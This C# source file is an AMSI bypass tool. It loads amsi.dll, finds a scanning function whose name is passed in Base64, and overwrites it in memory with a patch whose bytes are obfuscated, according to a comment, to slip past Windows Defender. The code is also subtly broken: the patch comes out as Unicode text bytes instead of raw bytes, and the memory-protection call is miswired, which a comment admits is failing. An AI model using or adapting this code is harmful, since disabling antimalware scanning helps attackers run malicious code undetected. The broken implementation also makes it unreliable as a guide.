using System;
using System.Runtime.InteropServices;
using System.Text;

public class AmsiBypass
{
    public static void Main(string[] args)
    {
        // Some adaptations throughout this method (now named Main) to dowgrade from C#7 to C#5
        
        // Load amsi.dll and get location of AmsiScanBuffer
        var lib = LoadLibrary("am" + "si.dll");
        // Read function name from a Base64 encoded string as an argument.
	    var name = Encoding.UTF8.GetString(Convert.FromBase64String(args[0]));
	    Console.WriteLine("->" + name + "<-");
	    var asb = GetProcAddress(lib, name);

        var patch = GetPatch;
	    uint oldProtect = 0;

        // Set region to RWX ----> This is failing!
        var foo = VirtualProtect(asb, (UIntPtr)patch.Length, 0x40, oldProtect);

        // Copy patch
        Marshal.Copy(patch, 0, asb, patch.Length);

        // Restore region to RX
	    var baz = VirtualProtect(asb, (UIntPtr)patch.Length, oldProtect, Convert.ToUInt32(foo));
    }

    static byte[] GetPatch
    {
        get
        {
            // Avoid Defender scan when using Add-Type in PowerShell.
            // https://twitter.com/HackingDave/status/1272373210797965312
            string haha = "mooB8,moo57,moo00,moo07,moo80,mooC3";
            string replaced = haha.Replace("moo", ("0x"));
            return Encoding.Unicode.GetBytes(replaced);
        }
    }

    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(
        IntPtr hModule,
        string procName);

    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(
        string name);

    [DllImport("kernel32")]
    static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        uint lpflOldProtect);
}
